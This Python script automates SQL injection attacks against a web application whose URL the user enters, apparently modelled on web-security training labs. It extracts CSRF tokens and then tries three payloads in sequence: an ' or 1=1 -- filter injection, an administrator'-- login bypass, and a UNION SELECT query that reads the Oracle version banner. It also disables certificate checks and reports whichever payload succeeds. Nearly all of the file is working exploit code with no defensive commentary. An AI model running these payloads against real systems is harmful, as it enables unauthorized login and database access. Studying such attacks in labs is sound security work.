try:
    import requests, re, dotenv, sys
    from pathlib import Path
    sys.path.append(str(Path(__file__).parent.parent))
    from config import parse_args, is_success
except ImportError as e:
    print(e)

class Sqli:
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.login_url = f"{self.url}/login"
        self.session = requests.Session()
        args, proxy = parse_args()
        if proxy:
            self.session.proxies.update(proxy)  
        self.session.verify = False

    def csrf_token_extract(self):
        try:
            url_get = self.session.get(url=self.login_url).text
            match = re.search(r'name="csrf" value="([^"]+)"', url_get)
            if not match or match == None or match == "":
                return False
            csrf = match.group(1)
            return csrf
        except requests.exceptions.RequestException as e:
            print(f"RequestError: {e}")
            return None
        except ValueError as e: 
            print(f"Unexpected error: {e}")
            return None

    def login(self, username, password):
        csrf_token = self.csrf_token_extract()
        if not csrf_token:
            return False
        login_info = {
            "username": f"{username}", 
            "password": f"{password}", 
            "csrf": csrf_token 
        }   
        try:
            self.login_page_post = self.session.post(url=self.login_url,  data=login_info,  allow_redirects=True)
            return True

        except requests.exceptions.Timeout:
            print("Error: Request timed out")
            return False
        
        except requests.exceptions.RequestException as e:
            print(f"Error: Network request failed - {e}")
            return False
        
    def check_login(self):
        try:
            request = requests.get(f"{self.url}/my-account?id=administrator")
            if request.status_code != 200:
                return False
            return True
        
        except requests.exceptions.Timeout:
            print("Error: Request timed out")
            return False
        
        except requests.exceptions.RequestException as e:
            print(f"Error: Network request failed - {e}")
            return False

    def released_sqli(self):
        try:
            print("Trying released sqli")
            exploit_result = self.session.get(url=f"{self.url}/filter?category=' or 1=1 --")
            if exploit_result.status_code != 200:
                return False
            
            if not is_success(self):
                return False 
            print("Exploit successfull.\nPayload: or 1=1 --")  
            return True
        except Exception as e:
            print(f"{e}")
            return False
        
    
    def sqli_login_bypass(self):
        try:
            print("Trying sqli login bypass")
            login_post_status = self.login("administrator'--", "hi")
            login_get_status = self.check_login()
            if not login_post_status and not login_get_status:
                return False
            
            if not is_success(self):
                return False 
            
            print("Exploit successfull.\nPayload: administrator'--")
            return True
        except Exception as e:
            print(f"{e}")
            return False
    
    def oracle_database(self):
        try:
            exploit_result = self.session.get(url=f"{self.url}/filter?category=' union select null, banner from v$version --")
            if exploit_result.status_code != 200:
                return False
            
            if not is_success(self):
                return False 

            print("Exploit successfull. \nPayload: union select null, banner from v$version --")
            return True
        except Exception as e:
            print(f"{e}")
            return False
    
    def main(self):
        dotenv.load_dotenv(dotenv_path="../.env")
        exploit_methods = [
            ("released_sqli", self.released_sqli),
            ("login_bypass", self.sqli_login_bypass),
            ("oracle_database", self.oracle_database)
        ]

        for method_name, method in exploit_methods:
            try:
                if method():
                    print(f"{method_name} was successfull")
                    print("Bye bye ˙◠˙")
                    return True
            except Exception as e:
                print(f"{method_name} failed: {e}")
                continue
            except KeyboardInterrupt:
                print("Keyboard interrupt detected. Exiting shell....")
        
        print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
        return False
        
if __name__ == "__main__":
    url = input("Enter the url: ")
    if url is not None or url != "":
        sqli = Sqli(url)
        sqli.main()
    else:
        print("Please enter the url")